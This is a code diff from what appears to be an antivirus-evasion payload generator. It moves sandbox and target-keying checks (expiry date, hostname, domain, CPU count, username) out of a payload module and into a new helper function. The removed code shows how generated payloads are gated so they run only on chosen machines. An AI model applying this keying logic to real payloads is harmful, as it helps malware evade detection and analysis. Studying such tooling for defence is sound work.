@@ -11,6 +11,7 @@ from datetime import date
 from datetime import timedelta
 from Tools.Evasion.evasion_common import encryption
 from Tools.Evasion.evasion_common import evasion_helpers
+from Tools.Evasion.evasion_common import gamemaker
 
 
 class PayloadModule:
@@ -78,67 +79,8 @@ class PayloadModule:
         # to make the payload
         num_tabs_required = 0
 
-        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":
-
-            RandToday = evasion_helpers.randomString()
-            RandExpire = evasion_helpers.randomString()
-
-            todaysdate = date.today()
-            expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))
-
-            # Create Payload code
-            payload_code += '\t' * num_tabs_required + 'from datetime import datetime\n'
-            payload_code += '\t' * num_tabs_required + 'from datetime import date\n'
-            payload_code += '\t' * num_tabs_required + RandToday + ' = datetime.now()\n'
-            payload_code += '\t' * num_tabs_required + RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
-            payload_code += '\t' * num_tabs_required + 'if ' + RandToday + ' < ' + RandExpire + ':\n'
-
-            # Add a tab for this check
-            num_tabs_required += 1
-
-        if self.required_options["HOSTNAME"][0].lower() != "x":
-
-            rand_hostname = evasion_helpers.randomString()
-
-            payload_code += '\t' * num_tabs_required + 'import platform\n'
-            payload_code += '\t' * num_tabs_required + rand_hostname + ' = platform.node()\n'
-            payload_code += '\t' * num_tabs_required + 'if \"' + self.required_options["HOSTNAME"][0].lower() + '\" in ' + rand_hostname + '.lower():\n'
-
-            # Add a tab for this check
-            num_tabs_required += 1
-
-        if self.required_options["DOMAIN"][0].lower() != "x":
-
-            rand_domain = evasion_helpers.randomString()
-
-            payload_code += '\t' * num_tabs_required + 'import socket\n'
-            payload_code += '\t' * num_tabs_required + rand_domain + ' = socket.getfqdn()\n'
-            payload_code += '\t' * num_tabs_required + 'if \"' + self.required_options["DOMAIN"][0].lower() + '\" in ' + rand_domain + '.lower():\n'
-
-            # Add a tab for this check
-            num_tabs_required += 1
-
-        if self.required_options["PROCESSORS"][0].lower() != "x":
-
-            rand_processor_count = evasion_helpers.randomString()
-
-            payload_code += '\t' * num_tabs_required + 'import multiprocessing\n'
-            payload_code += '\t' * num_tabs_required + rand_processor_count + ' = multiprocessing.cpu_count()\n'
-            payload_code += '\t' * num_tabs_required + 'if ' + rand_processor_count + ' >= ' + self.required_options["PROCESSORS"][0] + ':\n'
-
-            # Add a tab for this check
-            num_tabs_required += 1
-
-        if self.required_options["USERNAME"][0].lower() != "x":
-
-            rand_user_name = evasion_helpers.randomString()
-
-            payload_code += '\t' * num_tabs_required + 'import getpass\n'
-            payload_code += '\t' * num_tabs_required + rand_user_name + ' = getpass.getuser()\n'
-            payload_code += '\t' * num_tabs_required + 'if \'' + self.required_options["USERNAME"][0].lower() + '\' in ' + rand_user_name + '.lower():\n'
-
-            # Add a tab for this check
-            num_tabs_required += 1
+        payload_code2, num_tabs_required = gamemaker.senecas_games(self)
+        payload_code = payload_code + payload_code2
 
         # helper method that returns the sum of all ord values in a string % 0x100
         payload_code += '\t' * num_tabs_required + "def " + sumMethodName + "(s): return sum([ord(ch) for ch in s]) % 0x100\n"
